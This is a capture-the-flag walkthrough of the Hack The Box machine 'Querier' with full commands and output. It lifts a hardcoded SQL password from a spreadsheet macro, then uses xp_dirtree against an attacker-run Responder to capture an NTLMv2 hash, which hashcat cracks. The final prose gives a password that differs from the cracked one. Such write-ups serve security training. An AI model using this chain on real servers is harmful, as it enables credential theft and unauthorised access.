<center><h1>Querier</h1></center>
<br><br>
First we start with an nmap scan

```
# Nmap 7.80 scan initiated Sun Oct 13 16:10:37 2019 as: nmap -sV -sC -T4 -p- 10.10.10.125
Nmap scan report for 10.10.10.125
Host is up (0.059s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-10-13T20:11:31
|_Not valid after:  2049-10-13T20:11:31
|_ssl-date: 2019-10-13T20:18:54+00:00; +58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 57s, deviation: 0s, median: 57s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-13T20:18:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 13 16:17:56 2019 -- 1 IP address (1 host up) scanned in 438.55 seconds
```
So there are a lot of ports open but most of them are completely useless. Lets takes a look at the ```smb``` shares first. I'll use ```smbmap``` to list the shares.
```
# smbmap -u none -p none -H 10.10.10.125
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.125...
[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	Reports                                           	READ ONLY
```
Looks like there is one shared folder named ```Reports``` that we have Read only permission to. Next I will mount the drive so I can take a closer look.
```
# mount -t cifs //10.10.10.125/Reports /mnt -o rw
```
Now if I navigate to the ```/mnt``` directory and list all the files in there, I will see one file.
```
# cd /mnt
# ls
'Currency Volume Report.xlsm'
```
When opening the file a message pops up telling us that the file contains macros. This gives us a hint of where to look.

<center><img src="/htb/querier/macros.png"></center>
<br>
Taking a look at the macros we do find what looks like a username ```reporting``` and password ```Pwd=PcwTWTHRwryjc$c6```.
```
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"

  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```
With these credentials I can log into the mssql server. For this I will use impackets  ```mssqlclient.py```
```
# python mssqlclient.py -p 1433 -windows-auth Reporting:PcwTWTHRwryjc\$c6@10.10.10.125
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```
Running the help command will show that I cant actually execute and sql commands, only some impacket commands that are built into the script. I also don't have permission to execute anything useful so at this point it is time to run ```Responder``` and user ```xp_dirtree``` to capture the NTLM hashes. First a start of Responder.
```
# responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.4.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.39]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
```
Then I go back to the mssql and use xp_dirtree
```
SQL> xp_dirtree "\\10.10.14.39\test"
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   
```
Now going back to ```Responder``` there should be a hash.
```
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:db5dfc3bad2b6b9b:79013FFBCE93BD19B112246D3D630416:0101000000000000C0653150DE09D2019C0D46FD0AD2A011000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000B36A82E0FF14FD9A285346ABA34DC7792F72A9CFA96E2A09DB881DCF89A9015D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003900000000000000000000000000
```
We can get the password by copying the hash into a text file and then using ```hashcat``` to crack it.
```
# hashcat -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 4096/14004 MB allocatable, 16MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

MSSQL-SVC::QUERIER:db5dfc3bad2b6b9b:79013ffbce93bd19b112246d3d630416:0101000000000000c0653150de09d2019c0d46fd0ad2a011000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b36a82e0ff14fd9a285346aba34dc7792f72a9cfa96e2a09db881dcf89a9015d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003900000000000000000000000000:corporate568

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: hashes.ntlmv2
Time.Started.....: Sun Oct 13 19:36:37 2019 (6 secs)
Time.Estimated...: Sun Oct 13 19:36:43 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2905.9 kH/s (4.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 17924096/28688770 (62.48%)
Rejected.........: 0/17924096 (0.00%)
Restore.Point....: 8945664/14344385 (62.36%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: cowee48 -> coreyr1

Started: Sun Oct 13 19:36:27 2019
Stopped: Sun Oct 13 19:36:44 2019
```
After on a few seconds it gives us the password ```corporate569```
